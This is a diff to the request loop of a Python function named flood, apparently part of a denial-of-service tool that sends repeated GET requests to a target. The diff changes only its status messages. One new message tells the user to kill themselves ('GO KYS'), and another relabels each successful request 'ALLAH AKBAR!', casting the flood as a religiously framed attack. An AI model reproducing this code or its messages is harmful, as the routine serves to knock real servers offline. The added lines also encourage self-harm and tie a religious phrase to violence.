@@ -25,12 +25,12 @@ def flood(target):
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
-        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
+        print(f"{Fore.RED}[!] {Fore.MAGENTA}TIMED OUT GO KYS{Fore.RESET}")
     except Exception as e:
         print(
-            f"{Fore.MAGENTA}Error while sending GET request\n{Fore.MAGENTA}{e}{Fore.RESET}"
+            f"{Fore.MAGENTA}soldier faiiled rip -_-\n{Fore.MAGENTA}{e}{Fore.RESET}"
         )
     else:
         print(
-            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
+            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}ALLAH AKBAR! Payload size: {len(payload)}.{Fore.RESET}"
         )
